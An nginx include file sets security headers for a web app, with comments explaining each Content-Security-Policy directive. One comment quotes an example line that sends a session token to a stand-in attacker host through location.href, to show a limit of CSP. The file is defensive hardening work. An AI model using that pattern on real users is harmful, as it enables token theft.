# Security headers shared by every location block.
#
# IMPORTANT: nginx's `add_header` is inherited by a nested block ONLY if that
# block declares no `add_header` of its own. Any location that adds a header
# must therefore `include` this file as well, or it silently loses all of these.
#
# Content-Security-Policy rationale (see also: the app is served same-origin
# with the API under /api, so no cross-origin API host is needed):
#
#   default-src 'self'      Deny by default.
#   script-src  'self'      Vite emits a single external module bundle with no
#                           inline <script>, so no 'unsafe-inline'/'unsafe-eval'
#                           is required. This is the directive that matters most
#                           for XSS — keep it strict.
#   style-src   ... 'unsafe-inline'
#                           Required: Vuetify injects inline style attributes at
#                           runtime, and index.html carries an inline <style> for
#                           the pre-mount loader. fonts.googleapis.com serves the
#                           Open Sans stylesheet @import'ed from that block.
#   font-src    ...         Self-hosted woff2/ttf, plus fonts.gstatic.com (the
#                           actual font files the Google stylesheet points at).
#   img-src     ...         data: for inline icons/charts; cdn.discordapp.com for
#                           user avatars on the account/register screens.
#   connect-src 'self'      The important one for credential theft: blocks
#                           fetch/XHR/WebSocket/sendBeacon to any other origin.
#   frame-ancestors 'none'  Clickjacking protection (supersedes X-Frame-Options).
#   object-src  'none'      No plugins.
#   base-uri    'self'      Stops <base> tag hijacking of relative URLs.
#   form-action 'self'      Stops injected forms POSTing credentials offsite.
#
# Known limitation: CSP cannot block exfiltration via top-level navigation
# (e.g. location.href = 'https://attacker/?t=' + token). The `navigate-to`
# directive that would have covered this was never shipped by browsers.
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data: https://cdn.discordapp.com; connect-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'self'; form-action 'self'" always;

# Defence in depth alongside the CSP above.
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
# Legacy equivalent of frame-ancestors, for older browsers.
add_header X-Frame-Options "DENY" always;
